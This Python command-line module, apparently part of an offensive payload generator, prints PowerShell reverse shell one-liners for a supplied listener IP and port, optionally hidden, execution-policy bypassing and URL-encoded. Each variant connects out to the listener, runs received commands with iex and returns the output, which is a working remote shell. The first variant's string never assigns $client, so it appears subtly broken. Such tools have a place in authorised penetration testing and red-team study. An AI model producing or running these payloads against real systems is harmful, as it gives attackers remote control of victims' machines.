import click
from colorama import Fore
from urllib.parse import quote

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the output.")
@click.option("-v", "--variant", default="1", type=click.Choice(["1", "2"]),
              help="1=NoP NonI Hidden (default), 2=nop short form")
def command(listener_ip, listener_port, raw, urlencode, variant):
    """Return PowerShell reverse shell"""
    if variant == "1":
        cmd = (f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{listener_ip}",{listener_port});'
               f'$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};'
               f'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;'
               f'$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
               f'$sendback = (iex $data 2>&1 | Out-String );'
               f'$sendback2  = $sendback + "PS " + (pwd).Path + "> ";'
               f'$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);'
               f'$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()')
    else:
        cmd = (f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{listener_ip}',{listener_port});"
               f"$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};"
               f"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
               f"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);"
               f"$sendback = (iex $data 2>&1 | Out-String );"
               f"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
               f"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
               f"$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"")
    if urlencode:
        cmd = quote(cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}PowerShell reverse shell (variant {variant}):\n\t{Fore.WHITE}{cmd}")
    else:
        click.secho(cmd, nl=False)
